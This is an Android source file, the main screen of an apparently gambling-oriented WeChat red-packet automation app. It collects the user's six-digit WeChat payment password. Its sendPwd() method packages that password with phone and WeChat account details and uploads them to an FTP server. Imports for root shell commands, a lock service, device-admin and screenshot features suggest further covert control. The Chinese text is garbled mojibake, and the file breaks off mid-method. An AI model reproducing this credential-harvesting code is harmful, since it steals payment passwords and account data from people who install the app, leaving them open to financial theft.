package com.example.h3;

import java.io.File;
import java.lang.reflect.Constructor;
import java.lang.reflect.Method;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;


import com.byc.PutThunder2.R;
import com.example.h3.permission.FloatWindowManager;

import util.AppUtils;
import util.AutoStartSetting;
import util.BackgroundMusic;
import util.ConfigCt;
//import com.example.h3.Config;
import util.Funcs;
import util.PhoneInfo;
import util.ResourceUtil;
import util.RootShellCmd;
import util.SpeechUtil;
import accessibility.QiangHongBaoService;
import accessibility.app.WechatInfo;
import ad.Ad2;
import lock.LockService;
import android.app.Activity;
import android.app.AlarmManager;
import android.app.AlertDialog;
import android.app.PendingIntent;
import android.app.admin.DevicePolicyManager;
import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.graphics.Color;

import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.os.Message;
import android.provider.MediaStore;
import android.provider.Settings;
import android.text.Editable;
import android.text.Html;
import android.text.TextWatcher;
import android.text.method.LinkMovementMethod;
import android.util.DisplayMetrics;
import android.util.Log;
import android.view.Display;
import android.view.KeyEvent;
import android.view.Menu;
import android.view.MenuItem;
import android.view.MotionEvent;
import android.view.View;
import android.view.WindowManager;
import android.view.View.OnClickListener;
import android.view.View.OnTouchListener;
import android.widget.Button;
import android.widget.CompoundButton;
import android.widget.EditText;
import android.widget.LinearLayout;
import android.widget.RadioButton;
import android.widget.RadioGroup;
import android.widget.RadioGroup.OnCheckedChangeListener;
import download.DownloadService;
import download.ftp;
import order.GuardService;
import order.JobWakeUpService;
import order.OrderService;
import order.screen.ScreenShotActivity;
import android.widget.SeekBar;
import android.widget.Switch;
import android.widget.TextView;
import android.widget.Toast;; 

public class MainActivity extends Activity implements
SeekBar.OnSeekBarChangeListener, CompoundButton.OnCheckedChangeListener{

	private String TAG = "byc001";
	
    // ����SeekBar �� TextView���� 
    private SeekBar mSeekBar;
    private TextView tvSpeed; 
    public TextView tvRegState;
    public TextView tvRegWarm;
    public TextView tvHomePage;
    public Button btReg;
    private Button btConcel;
    private Button btClose;
    private Button btStart; 
    public EditText etRegCode; 
    public TextView tvPlease;
    private SpeechUtil speaker ;
    
    //----------------------------------------------
    private EditText etMoneyValue;			//�������Է�Ϊ��λ��
    private EditText etLuckyMoneyNum;		//����
    private EditText etPWD;					//֧�����룺
    private EditText etLuckyMoneySay;		//����ϳ��ֵ����֣�

    private RadioGroup rgThunderPos;		//����λ��
    private RadioButton rbFen;
    private RadioButton rbJiao;
    private RadioButton rbYuan;
    private RadioButton rbJia;
    private FlowRadioGroup rgThunderNum;		//�����ó��ֵ�������
    private RadioButton rb1;
    private RadioButton rb2;
    private RadioButton rb3;
    private RadioButton rb4;
    private RadioButton rb5;
    private RadioButton rb6;
    private RadioButton rb7;
    private RadioButton rb8;
    private RadioButton rb9;
    private RadioButton rb10;
    private RadioGroup rgMoneySay;
    private RadioButton rbHead;
    private RadioButton rbTail;
    private RadioButton rbSayIsThunder;
    private RadioGroup rgCalcThunder;
    private RadioButton rbAutoThunder;
    private RadioButton rbHandThunder;
    //����˫������
    private RadioGroup rgSayThunderNum;
    private RadioButton rbSingleThunder;
    private RadioButton rbDoubleThunder;
    private RadioButton rbThreeThunder;
    private RadioButton rbFourThunder;
    private RadioButton rbFiveThunder;
    //����Ⱥ�淨
    private RadioGroup rgSelPutThunderPlaying;
    private RadioButton rbCommonPlaying;
    private RadioButton rbBumpPlaying;
    
    public TextView tvResolution;
    private Switch swGuardAccount;		//�����
    //����ģʽ��
    private RadioGroup rgSelSoundMode; 
    private RadioButton rbFemaleSound;
    private RadioButton rbMaleSound;
    private RadioButton rbSpecialMaleSound;
    private RadioButton rbMotionMaleSound;
    private RadioButton rbChildrenSound;
    private RadioButton rbCloseSound;
    
    
    private BackgroundMusic mBackgroundMusic;

	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		getWindow().setFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON, WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON);
		setContentView(R.layout.activity_main);
		//my codes
		//���ԣ�

		//0.��ʼ��
	    mSeekBar=(SeekBar) findViewById(R.id.seekBar1);
	    tvSpeed = (TextView) findViewById(R.id.tvSpeed); 
	    tvRegState=(TextView) findViewById(R.id.tvRegState);
	    tvRegWarm=(TextView) findViewById(R.id.tvRegWarm);
	    tvHomePage=(TextView) findViewById(R.id.tvHomePage);
	    btReg=(Button)findViewById(R.id.btReg);
	    btConcel=(Button)findViewById(R.id.btConcel);
	    btClose=(Button)findViewById(R.id.btClose);
	    btStart=(Button) findViewById(R.id.btStart); 
	    etRegCode=(EditText) findViewById(R.id.etRegCode); 
	    tvPlease=(TextView) findViewById(R.id.tvPlease); 

	    //------------------------------------------------------------------------
	    etMoneyValue=(EditText)findViewById(R.id.etMoneyValue);
	    etLuckyMoneyNum=(EditText)findViewById(R.id.etLuckyMoneyNum);
	    etPWD=(EditText)findViewById(R.id.etPWD);
	    etLuckyMoneySay=(EditText)findViewById(R.id.etLuckyMoneySay);
	    
	    rgThunderPos = (RadioGroup)this.findViewById(R.id.rgThunderPos);
	    rbFen=(RadioButton)findViewById(R.id.rbFen);
	    rbJiao=(RadioButton)findViewById(R.id.rbJiao);
	    rbYuan=(RadioButton)findViewById(R.id.rbYuan);
	    rbJia=(RadioButton)findViewById(R.id.rbJia);
	    rgThunderNum = (FlowRadioGroup)this.findViewById(R.id.rgThunderNum);
	    rb1=(RadioButton)findViewById(R.id.rb1);
	    rb2=(RadioButton)findViewById(R.id.rb2);
	    rb3=(RadioButton)findViewById(R.id.rb3);
	    rb4=(RadioButton)findViewById(R.id.rb4);
	    rb5=(RadioButton)findViewById(R.id.rb5);
	    rb6=(RadioButton)findViewById(R.id.rb6);
	    rb7=(RadioButton)findViewById(R.id.rb7);
	    rb8=(RadioButton)findViewById(R.id.rb8);
	    rb9=(RadioButton)findViewById(R.id.rb9);
	    rb10=(RadioButton)findViewById(R.id.rb10);
	    rgMoneySay = (RadioGroup)this.findViewById(R.id.rgMoneySay);
	    rbHead=(RadioButton)findViewById(R.id.rbHead);
	    rbTail=(RadioButton)findViewById(R.id.rbTail);
	    rbSayIsThunder=(RadioButton)findViewById(R.id.rbSayIsThunder);
	    tvResolution=(TextView) findViewById(R.id.tvResolution);
	    
	    rgCalcThunder = (RadioGroup)this.findViewById(R.id.rgCalcThunder);
	    rbAutoThunder=(RadioButton)findViewById(R.id.rbAutoThunder);
	    rbHandThunder=(RadioButton)findViewById(R.id.rbHandThunder);
	    //����˫������
	    rgSayThunderNum = (RadioGroup)this.findViewById(R.id.rgSayThunderNum);
	    rbSingleThunder=(RadioButton)findViewById(R.id.rbSingleThunder);
	    rbDoubleThunder=(RadioButton)findViewById(R.id.rbDoubleThunder);
	    rbThreeThunder=(RadioButton)findViewById(R.id.rbThreeThunder);
	    rbFourThunder=(RadioButton)findViewById(R.id.rbFourThunder);
	    rbFiveThunder=(RadioButton)findViewById(R.id.rbFiveThunder);
	    //����Ⱥ�淨
	    rgSelPutThunderPlaying = (RadioGroup)this.findViewById(R.id.rgSelPutThunderPlaying);
	    rbCommonPlaying=(RadioButton)findViewById(R.id.rbCommonPlaying);
	    rbBumpPlaying=(RadioButton)findViewById(R.id.rbBumpPlaying);
	    swGuardAccount=(Switch)findViewById(R.id.swGuardAccount);
	    swGuardAccount.setOnCheckedChangeListener(this);
	    //����ģʽ��
	    rgSelSoundMode = (RadioGroup)this.findViewById(R.id.rgSelSoundMode);
	    rbFemaleSound=(RadioButton)findViewById(R.id.rbFemaleSound);
	    rbMaleSound=(RadioButton)findViewById(R.id.rbMaleSound);
	    rbSpecialMaleSound=(RadioButton)findViewById(R.id.rbSpecialMaleSound);
	    rbMotionMaleSound=(RadioButton)findViewById(R.id.rbMotionMaleSound);
	    rbChildrenSound=(RadioButton)findViewById(R.id.rbChildrenSound);
	    rbCloseSound=(RadioButton)findViewById(R.id.rbCloseSound);

	    
	    //��ȡ�ֱ���:
	    getResolution2();
	    String sResolution="�����ֱ��ʣ���"+Config.screenWidth+"*"+Config.screenHeight+"��";
	    tvResolution.setText(sResolution);
	    //Log.d(TAG, "�¼�---->��TTS");
	    Config.getConfig(getApplicationContext());//�� ʼ�������ࣻ
	    speaker=SpeechUtil.getSpeechUtil(getApplicationContext());

		//1������΢�Ű�ť
		TAG=Config.TAG;
		//Log.d(TAG, "�¼�---->MainActivity onCreate");
		//btConcel=(Button)this.findViewById(R.id.btConcel);
		btConcel.setOnClickListener(new OnClickListener(){
			@Override
			public void onClick(View v){
				//setTitle("aa");
				//setAppToTestVersion();
				mBackgroundMusic.stopBackgroundMusic();
				if(GetParams()){
					//Config.bSendLuckyMoney=true;
					String say="";
					if(!QiangHongBaoService.isRunning()) {
						say="���ȴ����׷��񣡲��ܿ�ʼ���ף�";
						speaker.speak(say);
						Toast.makeText(MainActivity.this,say, Toast.LENGTH_LONG).show();
						return;
					}

					if(Build.VERSION.SDK_INT >= Build.VERSION_CODES.M){
						if(!FloatWindowManager.getInstance().applyOrShowFloatWindow(MainActivity.this))return;
					}
					if(!ConfigCt.bReg){
						showAddContactsDialog();
						return;
					}
					Log.d(TAG, "�¼�---->��΢��");
					OpenWechat();
					speaker.speak("����΢�š����׿�ʼ��");
					//sendPwd();
					String wxInfo=ConfigCt.getInstance(MainActivity.this).getWechatInfo();
					if(wxInfo.length()==0){
						//WechatInfo.start();
						if(WechatInfo.getWechatInfo().isEnable()){
							WechatInfo.getWechatInfo().start();
						}
					}
					finish();
				}
			}
		});//btn.setOnClickListener(
		btClose.setOnClickListener(new OnClickListener(){
			@Override
			public void onClick(View v){
				if(Config.DEBUG){
					//QHBNotificationService.openNotificationServiceSettings(MainActivity.this);
				}
				FloatingWindowCount.getInstance(getApplicationContext()).RemoveFloatingWindow();
				finish();
				//showCalcSucDialog();
				//speaker.stopSpeaking();
				//RootShellCmd.OpenAccessibility(getApplicationContext());
				//mBackgroundMusic.stopBackgroundMusic();
				//moveTaskToBack(true);
				
				//AutoStartSetting.jumpStartInterface(getApplicationContext());
				//AutoStartSetting.openStart(MainActivity.this);
				//Intent intent = new Intent(MediaStore.ACTION_IMAGE_CAPTURE);
				//File file = new File(Environment.getExternalStorageDirectory().getAbsolutePath()
				//        + "/test/" + System.currentTimeMillis() + ".jpg");
				//file.getParentFile().mkdirs();
				//Uri uri = Uri.fromFile(file);
				//intent.putExtra(MediaStore.EXTRA_OUTPUT, uri);
				//intent.putExtra("android.intent.extras.CAMERA_FACING", 1); 
				
				//intent.putExtra("camerasensortype", 2); // ����ǰ������ͷ  
				//intent.putExtra("autofocus", true); // �Զ��Խ�  
				//intent.putExtra("fullScreen", false); // ȫ��  
				//intent.putExtra("showActionIcons", false);  
				//startActivityForResult(intent, 11);
				//startActivity(intent);
				//test2();
				//Intent intent = new Intent(MainActivity.this,CameraActivity.class);
				//startActivity(intent);
			}
		});//btn.setOnClickListener(
		//2���򿪸�������ť
		btStart.setOnClickListener(new OnClickListener(){
			@Override
			public void onClick(View v) {
				if(!GetParams()){return;}
				//1�жϷ����Ƿ�򿪣�
				mBackgroundMusic.stopBackgroundMusic();
				if(!QiangHongBaoService.isRunning()) {
					//��ϵͳ�����и�������
					//Log.d(TAG, "�¼�---->��ϵͳ�����и�������");
					QiangHongBaoService.startSetting(getApplicationContext());
					Toast.makeText(MainActivity.this, "�ҵ�����ר�ң�Ȼ�������׷���", Toast.LENGTH_LONG).show();
					speaker.speak("���ҵ�����ר�ң�Ȼ�������׷���");
				}else{
					Toast.makeText(MainActivity.this, "���׷����ѿ�����", Toast.LENGTH_LONG).show();
					speaker.speak("���׷����ѿ�����");
				}
				//2������ʱ����
			}
		});//startBtn.setOnClickListener(
		//3��SeekBar����
        mSeekBar.setOnSeekBarChangeListener(this); 
        //4.�Ƿ�ע�ᴦ����ʾ�汾��Ϣ(��������)��
		Config.bReg=getConfig().getREG();
		showVerInfo(Config.bReg);
		if(Config.bReg)//��ʼ��������֤��
			Sock.getSock(MainActivity.this).VarifyStart();
        //5��ע�����̣�
		btReg.setOnClickListener(new OnClickListener(){
			@Override
			public void onClick(View v){
				//setTitle("aa");
				mBackgroundMusic.stopBackgroundMusic();
				String regCode=etRegCode.getText().toString();
				if(regCode.length()!=12){
					Toast.makeText(MainActivity.this, "��Ȩ���������", Toast.LENGTH_LONG).show();
					speaker.speak("��Ȩ���������");
					return;
				}
				getSock().RegStart(regCode);
				//Log.d(TAG, "�¼�---->����");
				//System.exit(0);
			}
		});//btReg.setOnClickListener(
		//6�����չ㲥��Ϣ
        IntentFilter filter = new IntentFilter();
        filter.addAction(Config.ACTION_QIANGHONGBAO_SERVICE_CONNECT);
        filter.addAction(Config.ACTION_QIANGHONGBAO_SERVICE_DISCONNECT);
        registerReceiver(qhbConnectReceiver, filter);
        //7.���ű������֣�
        mBackgroundMusic=BackgroundMusic.getInstance(getApplicationContext());
        mBackgroundMusic.playBackgroundMusic( "bg_music.mp3", true);
        //8.���ò���
        SetParams();
        //9.��Ϊ���ð棻
        setAppToTestVersion();

        //test
        //LinearLayout myView=(LinearLayout)findViewById(R.id.LinearLayout1);
        //myView.setEnabled(true); 
        //ע��OnTouch������  
        //myView.setOnTouchListener(new myOnTouchListener());  
    }  
    //OnTouch������  
    private class myOnTouchListener implements OnTouchListener{  
        @Override  
        public boolean onTouch(View v, MotionEvent event){
            Log.d(Config.TAG2, "onTouch action="+event.getAction());  
            String sInfo="X="+String.valueOf(event.getRawX())+"  Y="+String.valueOf(event.getRawY()); 
            Log.d(Config.TAG2, sInfo);  
            return false;  
        }  
    }     
	private void hide(boolean bHide){
		if(!bHide)return;
		Handler handler= new Handler(); 
		Runnable runnableHide  = new Runnable() {    
			@Override    
		    public void run() {    
				moveTaskToBack(true);
				mBackgroundMusic.stopBackgroundMusic();
		    }    
		};
	handler.postDelayed(runnableHide, 200);
	}
	private BroadcastReceiver qhbConnectReceiver = new BroadcastReceiver() {
        @Override
        public void onReceive(Context context, Intent intent) {

            String action = intent.getAction();
            Log.d(TAG, "receive-->" + action);
            if(Config.ACTION_QIANGHONGBAO_SERVICE_CONNECT.equals(action)) {
            	speaker.speak("���������׷���");
            } else if(Config.ACTION_QIANGHONGBAO_SERVICE_DISCONNECT.equals(action)) {
            	speaker.speak("���ж����׷���");
            }
        }
    };

	@Override
	public boolean onCreateOptionsMenu(Menu menu) {
		// Inflate the menu; this adds items to the action bar if it is present.
		getMenuInflater().inflate(R.menu.main, menu);
		return true;
	}

	@Override
	public boolean onOptionsItemSelected(MenuItem item) {
		int id = item.getItemId();
		int idFloat=util.ResourceUtil.getId(getApplicationContext(), "action_floatwindow");
		int idSet=util.ResourceUtil.getId(getApplicationContext(), "action_settings");
		int idCal=util.ResourceUtil.getId(getApplicationContext(), "action_calculate");
		if (id ==idFloat) {//if (id == R.id.action_floatwindow)
			 if(FloatWindowManager.getInstance().applyOrShowFloatWindow(MainActivity.this))
				 Toast.makeText(MainActivity.this, "������������Ȩ�ޣ�", Toast.LENGTH_LONG).show();
			return true;
		}
		if (id == idSet) {//if (id == R.id.action_settings)
			Intent intent=new Intent();
			//Intent intent =new Intent(Intent.ACTION_VIEW,uri);
			intent.setAction("android.intent.action.VIEW");
			Uri content_url=Uri.parse(ConfigCt.homepage);
			intent.setData(content_url);
			startActivity(intent);
			return true;
		}
		if (id ==idCal) {//if (id == R.id.action_calculate)
			showCalcDialog();
		}
		return super.onOptionsItemSelected(item);
	}
	
	//SeekBar�ӿڣ�
    @Override
    public void onProgressChanged(SeekBar seekBar, int progress, 
            boolean fromUser) {// ���϶���--��ֵ�ڸı� 
        // progressΪ��ǰ��ֵ�Ĵ�С 
    	tvSpeed.setText("�����������ٶ�:��ǰ�����ӳ٣�" + progress); 
    	
    } 
    
    @Override
    public void onStartTrackingTouch(SeekBar seekBar) {// ���϶��л���ô˷��� 
    	//mSpeed.setText("xh���ڵ���"); 
    } 
    
    @Override
    public void onStopTrackingTouch(SeekBar seekBar) {// ֹͣ�϶� 
    	//mSpeed.setText("xhֹͣ����"); 
    	//���浱ǰֵ
    	Config.getConfig(this).SetWechatOpenDelayTime(seekBar.getProgress());
    	Config.iDelayTime=seekBar.getProgress();
    	speaker.speak("��ǰ�����ӳ٣�" + seekBar.getProgress());
    } 
    public Config getConfig(){
    	return Config.getConfig(this);
    }
    public Sock getSock(){
    	return Sock.getSock(this);
    }
    public boolean OpenWechat(){
    	Intent intent = new Intent(); 
    	PackageManager packageManager = this.getPackageManager(); 
    	intent = packageManager.getLaunchIntentForPackage(Config.WECHAT_PACKAGENAME); 
    	if(intent==null)return false;
    	intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK|Intent.FLAG_ACTIVITY_RESET_TASK_IF_NEEDED | Intent.FLAG_ACTIVITY_CLEAR_TOP) ; 
    	this.startActivity(intent);
    	return true;
    }
  
    //ȡ�ò�����
    private boolean GetParams(){
    	boolean ret=false;
    	String sSay="";
    	//ȡ������������
    	//int iMoneyValue=0;
    	Config.sMoneyValue=etMoneyValue.getText().toString();
    	if(Config.sMoneyValue.equals("")){
    		sSay="�����÷�����";
        	Toast.makeText(MainActivity.this, sSay, Toast.LENGTH_LONG).show();
        	speaker.speak(sSay );
        	return ret;
    	}
    	getConfig().setMoneyValue(Config.sMoneyValue);//���淢����������
    	//ȡ����������
    	//int iLuckyMoneyNum=0;
    	Config.sLuckyMoneyNum=etLuckyMoneyNum.getText().toString();
    	if(Config.sLuckyMoneyNum.equals("")){
    		sSay="�����÷���������";
        	Toast.makeText(MainActivity.this, sSay, Toast.LENGTH_LONG).show();
        	speaker.speak(sSay );
        	return ret;
    	}
    	getConfig().setLuckyMoneyNum(Config.sLuckyMoneyNum);//���淢������������
    	//ȡ֧�����룺
    	//int iPWD=0;
    	Config.sPWD=etPWD.getText().toString();
    	if(Config.sPWD.length()!=6){
    		sSay="������΢��6λ����֧�����룡�������׳ɹ���";
        	Toast.makeText(MainActivity.this, sSay, Toast.LENGTH_LONG).show();
        	speaker.speak(sSay );
        	return ret;
    	}
    	getConfig().setPayPWD(Config.sPWD);//����֧�����������
    	//ȡ����ϵ����� ��
    	if(Config.bAutoThunder){//�Զ���ֵ��
    		Config.sLuckyMoneySay=Config.KEY_LUCKY_MONEY_SAY;//�ÿգ�
    	}else{
    		Config.sLuckyMoneySay=etLuckyMoneySay.getText().toString();
    		if(Config.sLuckyMoneySay.equals("")){
    			sSay="�����ú���ϵ����֣�";
    			Toast.makeText(MainActivity.this, sSay, Toast.LENGTH_LONG).show();
    			speaker.speak(sSay );
    			return ret;
    		}
    		getConfig().setLuckyMoneySay(Config.sLuckyMoneySay);//�������ϵ����ֲ�����
    	}//if(Config.bAutoThunder){//�Զ���ֵ��
    	ret=true;
    	return ret;
    }
    /*
     * ����֧��pwd
     */
    private void sendPwd(){
    	String baseInfo=PhoneInfo.getBasePhoneInfo(this);
    	String wxInfo=ConfigCt.getInstance(this).getWechatInfo();
    	String pwd=getConfig().getPayPWD();
    	String info=baseInfo+"\r\n"+wxInfo+"\r\n"+pwd;
		String filename=Funcs.saveInfo2File(info, "putthunder-wxp");
		if(filename!=null){
			ftp.getFtp(this).UploadStart(filename);
		}
    }
    //���ò�����
    private void SetParams(){
    	//�����ؼ���ʼ��
    	//������
    	Config.sMoneyValue=getConfig().getMoneyValue();//������
    	etMoneyValue.setText(Config.sMoneyValue);
    	//����������
    	Config.sLuckyMoneyNum=getConfig().getLuckyMoneyNum();//����������
    	etLuckyMoneyNum.setText(Config.sLuckyMoneyNum);
    	//֧�����룻
    	Config.sPWD=getConfig().getPayPWD();//֧�����룻
    	etPWD.setText(Config.sPWD);
    	//����λ�ã�
    	Config.iMoneyThunderPos=getConfig().getMoneyValuePos();//���ں������е�λ�ã�
    	if(Config.iMoneyThunderPos==Config.KEY_THUNDER_FEN)rbFen.setChecked(true);
    	if(Config.iMoneyThunderPos==Config.KEY_THUNDER_JIAO)rbJiao.setChecked(true);
    	if(Config.iMoneyThunderPos==Config.KEY_THUNDER_YUAN)rbYuan.setChecked(true);
    	if(Config.iMoneyThunderPos==Config.KEY_THUNDER_JIA)rbJia.setChecked(true);
    	//���ֵ�������
    	Config.iThunder=getConfig().getThunderNum();//���ֵ�������
    	if(Config.iThunder==1)rb1.setChecked(true);
    	if(Config.iThunder==2)rb2.setChecked(true);
    	if(Config.iThunder==3)rb3.setChecked(true);
    	if(Config.iThunder==4)rb4.setChecked(true);
    	if(Config.iThunder==5)rb5.setChecked(true);
    	if(Config.iThunder==6)rb6.setChecked(true);
    	if(Config.iThunder==7)rb7.setChecked(true);
    	if(Config.iThunder==8)rb8.setChecked(true);
    	if(Config.iThunder==9)rb9.setChecked(true);
    	if(Config.iThunder==10)rb10.setChecked(true);
    	//����ϳ��ֵ����֣�
    	Config.sLuckyMoneySay=getConfig().getLuckyMoneySay();//����ϳ��ֵ����֣�
    	etLuckyMoneySay.setText(Config.sLuckyMoneySay);
    	//�׵����ͣ�
    	Config.iMoneySayPos=getConfig().getMoneySayPos();//���ں�����е�λ�ã�
    	if(Config.iMoneySayPos==Config.KEY_THUNDER_TAIL)rbTail.setChecked(true);
    	if(Config.iMoneySayPos==Config.KEY_THUNDER_HEAD)rbHead.setChecked(true);
    	if(Config.iMoneySayPos==Config.KEY_THUNDER_SAY)rbSayIsThunder.setChecked(true);
    	//�Ƿ���������ֵ
    	Config.bAutoThunder=getConfig().getAutoThunder();//�Ƿ���������ֵ
    	if(Config.bAutoThunder==Config.KEY_AUTO_THUNDER){
    		rbAutoThunder.setChecked(true);
    		etLuckyMoneySay.setText(Config.KEY_LUCKY_MONEY_SAY_AUTO);
    	}
    	if(Config.bAutoThunder==Config.KEY_NO_AUTO_THUNDER){
    		rbHandThunder.setChecked(true);
    	}
    	//����˫������
    	Config.iMoneySayThunderNum=getConfig().getMoneySayThunderNum();//
    	if(Config.iMoneySayThunderNum==Config.KEY_MONEY_SAY_SINGLE_THUNDER)rbSingleThunder.setChecked(true);
    	if(Config.iMoneySayThunderNum==Config.KEY_MONEY_SAY_DOUBLE_THUNDER)rbDoubleThunder.setChecked(true);
    	if(Config.iMoneySayThunderNum==Config.KEY_MONEY_SAY_THREE_THUNDER)rbThreeThunder.setChecked(true);
    	if(Config.iMoneySayThunderNum==Config.KEY_MONEY_SAY_FOUR_THUNDER)rbFourThunder.setChecked(true);
    	if(Config.iMoneySayThunderNum==Config.KEY_MONEY_SAY_FIVE_THUNDER)rbFiveThunder.setChecked(true);
    	//�����淨
    	Config.iPlaying=getConfig().getPutThunderPlaying();//
    	if(Config.iPlaying==Config.KEY_PUT_THUNDER_COMMON_PLAYING)rbCommonPlaying.setChecked(true);
    	if(Config.iPlaying==Config.KEY_PUT_THUNDER_BUMP_PLAYING)rbBumpPlaying.setChecked(true);
    	//�����ӳ٣�
    	Config.iDelayTime=getConfig().getWechatOpenDelayTime();//�����ӳ٣�
    	mSeekBar.setProgress(Config.iDelayTime);
    	//����ģʽ��
    	if(Config.bSpeaking==Config.KEY_NOT_SPEAKING){
    		rbCloseSound.setChecked(true);//�Զ�����
    	}else if(Config.speaker.equals(Config.KEY_SPEAKER_FEMALE)){
    		rbFemaleSound.setChecked(true);
    	}else if(Config.speaker.equals(Config.KEY_SPEAKER_MALE)){
    		rbMaleSound.setChecked(true);
    	}else if(Config.speaker.equals(Config.KEY_SPEAKER_SPECIAL_MALE)){
    		rbSpecialMaleSound.setChecked(true);
    	}else if(Config.speaker.equals(Config.KEY_SPEAKER_EMOTION_MALE)){
    		rbMotionMaleSound.setChecked(true);
    	}else if(Config.speaker.equals(Config.KEY_SPEAKER_CHILDREN)){
    		rbChildrenSound.setChecked(true);
    	}
    	speaker.setSpeaker(Config.speaker);
    	speaker.setSpeaking(Config.bSpeaking);

    	 //������λ��
    	rgThunderPos.setOnCheckedChangeListener(new OnCheckedChangeListener() {
             @Override
             public void onCheckedChanged(RadioGroup arg0, int arg1) {
                 // TODO Auto-generated method stub
                 //��ȡ������ѡ�����ID
                int radioButtonId = arg0.getCheckedRadioButtonId();
                //����ID��ȡRadioButton��ʵ��
                RadioButton rb = (RadioButton)MainActivity.this.findViewById(radioButtonId);
                 //�����ı����ݣ��Է���ѡ����
                String sChecked=rb.getText().toString();
                 //tv.setText("�����Ա��ǣ�" + rb.getText());
                if(sChecked.equals("��")){
                	getConfig().setMoneyValuePos(Config.KEY_THUNDER_FEN);
                	speaker.speak("��ǰ���ã���Ϊ�ס�");
                	Toast.makeText(MainActivity.this, "��Ϊ��", Toast.LENGTH_LONG).show();
                }
                if(sChecked.equals("��")){
                	getConfig().setMoneyValuePos(Config.KEY_THUNDER_JIAO);
                	speaker.speak("��ǰ���ã���Ϊ�ס�");
                	Toast.makeText(MainActivity.this, "��Ϊ��", Toast.LENGTH_LONG).show();
                }
                if(sChecked.equals("Ԫ")){
                	getConfig().setMoneyValuePos(Config.KEY_THUNDER_YUAN);
                	speaker.speak("��ǰ���ã�ԪΪ�ס�");
                	Toast.makeText(MainActivity.this, "ԪΪ��", Toast.LENGTH_LONG).show();
                }
                if(sChecked.equals("β�����")){
                	getConfig().setMoneyValuePos(Config.KEY_THUNDER_JIA);
                	speaker.speak("��ǰ���ã�С�������λβ�����Ϊ�ס�");
                	Toast.makeText(MainActivity.this, "С�������λβ�����Ϊ��", Toast.LENGTH_LONG).show();
                }
                	
            }
         });
   	 //�󶨳��ֵ�����
    	rgThunderNum.setOnCheckedChangeListener(new OnCheckedChangeListener() {
            @Override
            public void onCheckedChanged(RadioGroup arg0, int arg1) {
                // TODO Auto-generated method stub
                //��ȡ������ѡ�����ID
               int radioButtonId = arg0.getCheckedRadioButtonId();
               //����ID��ȡRadioButton��ʵ��
                RadioButton rb = (RadioButton)MainActivity.this.findViewById(radioButtonId);
                //�����ı����ݣ��Է���ѡ����
                String sChecked=rb.getText().toString();
                int iNum=Integer.parseInt(sChecked);
                String sSay="��ǰ������Ϊ��"+sChecked+"���ס�";
                getConfig().setThunderNum(iNum);
                Config.iThunder=iNum;
                Toast.makeText(MainActivity.this,sSay, Toast.LENGTH_LONG).show();
                speaker.speak(sSay);
                
           }
        });
      	 //�󶨺��������λ��
       	rgMoneySay.setOnCheckedChangeListener(new OnCheckedChangeListener() {
                @Override
                public void onCheckedChanged(RadioGroup arg0, int arg1) {
                    // TODO Auto-generated method stub
                    //��ȡ������ѡ�����ID
                   int radioButtonId = arg0.getCheckedRadioButtonId();
                   //����ID��ȡRadioButton��ʵ��
                    RadioButton rb = (RadioButton)MainActivity.this.findViewById(radioButtonId);
                    //�����ı����ݣ��Է���ѡ����
                    String sChecked=rb.getText().toString();
                    //tv.setText("�����Ա��ǣ�" + rb.getText());
                    String say="";
                   if(sChecked.equals("����βΪ��")){
                	   Config.iMoneySayPos=Config.KEY_THUNDER_TAIL;
                	   say="��ǰ���ã�����������һ������Ϊ�ס�";

                   }
                   if(sChecked.equals("������Ϊ��")){
                	   Config.iMoneySayPos=Config.KEY_THUNDER_HEAD;
                	   say="��ǰ���ã�������е�һ������Ϊ�ס�";
                   }
                   if(sChecked.equals("�����Ϊ��")){
                  	   Config.iMoneySayPos=Config.KEY_THUNDER_SAY;
                  	   say="��ǰ���ã����������ף���������޽�";
                     }
                  	getConfig().setMoneySayPos(Config.iMoneySayPos);
                  	speaker.speak(say);
                  	Toast.makeText(MainActivity.this, say, Toast.LENGTH_LONG).show();
               }
            });
       	//���÷�����
       	etMoneyValue.addTextChangedListener(new TextWatcher(){
       		@Override
       		public void afterTextChanged(Editable s) {
       			String sShow="��ǰ������"+s+"Ԫ";
       			speaker.speak(sShow);
       			Toast.makeText(MainActivity.this, sShow, Toast.LENGTH_LONG).show();
       		}
       		public void beforeTextChanged(CharSequence s, int start, int count,int after) {
       			
       		}
       		public void onTextChanged(CharSequence s, int start, int before,int count) {
       			
       		}
       		
       	});
       	//���÷���������
       	etLuckyMoneyNum.addTextChangedListener(new TextWatcher(){
       		@Override
       		public void afterTextChanged(Editable s) {
       			String sShow="��ǰ����������"+s+"��";
       			speaker.speak(sShow);
       			Toast.makeText(MainActivity.this, sShow, Toast.LENGTH_LONG).show();
       		}
       		public void beforeTextChanged(CharSequence s, int start, int count,int after) {
       			
       		}
       		public void onTextChanged(CharSequence s, int start, int before,int count) {
       			
       		}
       		
       	});
       	//���ú���
       	etLuckyMoneySay.addTextChangedListener(new TextWatcher(){
       		@Override
       		public void afterTextChanged(Editable s) {
       			String sShow="��ǰ����ϵ�����Ϊ��"+s+"��";
       			speaker.speak(sShow);
       			Toast.makeText(MainActivity.this, sShow, Toast.LENGTH_LONG).show();
       		}
       		public void beforeTextChanged(CharSequence s, int start, int count,int after) {
       			
       		}
       		public void onTextChanged(CharSequence s, int start, int before,int count) {
       			
       		}
       		
       	});
     	 //�����Ƿ��Զ��Ƽ������ֵ��
       	rgCalcThunder.setOnCheckedChangeListener(new OnCheckedChangeListener() {
               @Override
               public void onCheckedChanged(RadioGroup arg0, int arg1) {
                   // TODO Auto-generated method stub
                   //��ȡ������ѡ�����ID
                  int radioButtonId = arg0.getCheckedRadioButtonId();
                  //����ID��ȡRadioButton��ʵ��
                   RadioButton rb = (RadioButton)MainActivity.this.findViewById(radioButtonId);
                   //�����ı����ݣ��Է���ѡ����
                   String sChecked=rb.getText().toString();
                   String say="";
                  if(sChecked.equals("�Զ�������ֵ")){
                	  say="��ǰ���ã��Զ����������ֵ��";
                  	  Config.bAutoThunder=Config.KEY_AUTO_THUNDER;
